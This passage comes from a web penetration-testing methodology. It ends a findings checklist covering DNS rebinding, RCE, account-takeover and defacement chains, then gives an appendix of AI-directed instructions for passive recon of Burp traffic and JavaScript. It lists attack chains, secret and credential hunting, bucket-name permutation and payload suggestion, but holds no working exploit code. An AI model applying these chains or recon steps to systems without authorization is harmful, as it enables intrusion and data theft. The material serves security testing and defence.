- Low-TTL attacker domain rebinds to an internal IP after page load, defeating SOP's host check -> attacker JS reaches internal/localhost services.
- **Check:** internal services validate `Host` against an allow-list and require auth, not network position.

### 13.8 Composite / outcome findings
- **RCE** (end of SQLi / command injection / deserialization / SSTI-EL / upload / LFI-RFI / SSRF chains) - confirm with a benign `id`/delay/OAST callback.
- **Account Takeover** - chain no-rate-limit + host-header reset poisoning / IDOR on reset / CSRF on email-password change / XSS session theft / OAuth code theft / JWT forgery.
- **Defacement** - via stored XSS/SSTI, cache poisoning, upload/RFI overwrite, SQLi, or subdomain takeover.

---

## 14. Appendix - Passive Traffic & JavaScript Analysis (AI-assisted Burp/JS recon)

A master methodology for exhaustive **passive** analysis of a Burp traffic export (XML/raw HTTP), JavaScript files, API responses, headers, tokens and embedded assets. Perform passive analysis only; do not assume exploitation success. Separate: confirmed findings | probable findings | interesting leads | false positives | items needing manual verification.

**1. Full API enumeration** - extract and normalize every endpoint: internal/versioned/hidden/mobile APIs, GraphQL, WebSocket, admin panels, CDN/API hosts, third-party integrations, Swagger/OpenAPI refs, API gateways, upload/export/download/auth/payment/OTP/encryption/SSO-OAuth endpoints. For each: HTTP methods, parameters, headers, auth requirements, JWT usage, session handling, attack surface, business logic, object identifiers, user-controlled input locations. Produce a categorized endpoint inventory.

**2. JavaScript recon & static analysis** - from every JS file extract: hidden endpoints/API routes, debug functionality, feature flags, hardcoded secrets/access tokens/JWT secrets/API keys/bearer tokens, Firebase/AWS/GCP/Azure configs, encryption keys/IVs, client-side crypto logic, obfuscated code, source maps, internal comments/domains, hidden admin panels, dangerous sinks, prototype-pollution vectors, DOM-XSS sinks, open-redirect logic, CSP-bypass opportunities, dangerous regex, file-upload logic, user-controlled DOM insertion, token/UUID generation logic, mobile deep links, staging/UAT references, bucket names, cloud-storage/CDN URLs. For minified JS: deobfuscate logically, trace security-sensitive flows (fetch/axios/XHR, token injection, request signing, upload handlers, lazy chunks, dynamic imports, env vars).

**3. XSS discovery & injection-point mapping** - find all reflected/stored/DOM-XSS, HTML/template/markdown injection, Angular/React/Vue rendering issues, unsafe `innerHTML`/`document.write`/`eval`/`new Function`, `postMessage` abuse, URL/search/fragment reflections, JSON injection, SVG-upload abuse. For each: parameter, endpoint, reflection context, sink type, sanitization status, encoding, payload possibilities, exploitability, recommended test payloads. Mark high-confidence vs probable vs lead.

**4. Injection surface discovery** - identify all potential SQLi/NoSQLi/SSTI/SSRF/XXE/command/LDAP/XPath/CRLF, request-smuggling indicators, header injection, file inclusion, path traversal, open redirect, cache poisoning, prototype pollution, GraphQL abuse, IDOR/BOLA, mass assignment, race conditions, business-logic abuse, weak authorization. Classify each parameter: user-controlled / server-generated / encoded / encrypted / serialized / potentially injectable.

**5. Authentication & session analysis** - JWT structure, OAuth/SSO flows, MFA/OTP logic, session cookies, token refresh, access-token scopes, role identifiers, privilege-escalation indicators, missing authorization, BOLA/IDOR, static OTP patterns, token predictability/entropy, account-recovery logic; identify sensitive claims, leaked/reusable tokens, internal identifiers, misconfigured headers.

**6. Encryption & crypto reverse engineering** - identify Base64/AES/DES-3DES/RSA/XOR/custom crypto, JWT signing, HMAC, nonce/IV patterns, key-derivation, static IV/keys, hardcoded material, client-side encryption, replay possibilities. For each encrypted request: explain probable encryption workflow and where it occurs, trace the JS functions, identify reusable secrets and client-side weaknesses, whether encryption is cosmetic or meaningful, how email/password/UID/token fields transform, whether tokens are generated pre-auth or are deterministic/replayable, whether encrypted identifiers are improperly trusted as authorization. Do not fabricate cryptographic conclusions; mark uncertainty.

**7. Cloud & bucket discovery** - aggressively hunt cloud assets across URLs/JS/HTML/JSON/XML/HAR/headers/CSP/source-maps/bodies/encoded strings. **AWS:** S3 buckets, CloudFront, API Gateway (`execute-api`), Lambda URLs, Cognito, access-key IDs, regions, presigned URLs, `s3.amazonaws.com`, virtual-hosted/path-style S3, static website endpoints, Beanstalk/EC2/ECR/SNS/SQS. **GCP:** `storage.googleapis.com`, `appspot.com`, `firebaseio.com`, service-account leaks. **Azure:** `blob.core.windows.net`, `azurewebsites.net`, function URLs. **Others:** `r2.dev`/Workers/Pages, `supabase.co`, `digitaloceanspaces.com`, `backblazeb2.com`, minio, wasabi, aliyuncs. Infer bucket names from subdomains/CDN/asset URLs/JS constants/upload endpoints/app/org names; generate permutations; correlate with environments (dev/staging/prod) and x-amz-*/ETag/signed-URL patterns; infer likely anonymous accessibility and whether listing is enabled. Look for presigned-URL generation, STS tokens, upload policies, multipart flows, hidden staging/QA/backup/log buckets, Terraform state, CI/CD artifacts, `.env` exposure.

**8. Sensitive data exposure** - emails, phone numbers, internal IPs/domains, employee IDs, tokens/keys/secrets/credentials, access/session tokens, Authorization headers, cookies, debug info, stack traces, env vars, build metadata, source maps, internal service/DB names. Classify severity.

**9. Request/response correlation** - map application flow and auth sequences, identify privileged endpoints and hidden functionality, detect trust boundaries and parameter propagation, track user/role identifiers and encrypted-payload generation.

**Output sections:** Executive Summary | High-Risk Findings | Interesting Leads | Endpoint Inventory | Parameter Inventory | JavaScript Findings | XSS Candidates | Injection Candidates | Auth & Session Analysis | Crypto Analysis | Bucket Discovery | Secrets & Sensitive Data | Recommended Manual Testing Areas | Potential Findings | Suggested Payloads | Hidden/Internal Infrastructure | Confidence Levels.

**Rules:** correlate deeply (not shallow regex); for every request/response/JS determine trust boundaries, attacker-controlled input, sensitive flows, auth context, reflected content, hidden functionality, framework usage, serialization formats, crypto usage, cloud usage, third-party integrations, and exploitation paths. When uncertain, state it with a confidence score and reasoning. Never hallucinate findings, invent vulns, assume exploitation success, or fabricate secrets/endpoints. Always explain *why* a finding matters and *how* it was identified, correlate evidence across files, prioritize exploitable findings, include evidence snippets, attack hypotheses, manual-verification paths, suggested payloads, severity, and CWE mapping where appropriate.
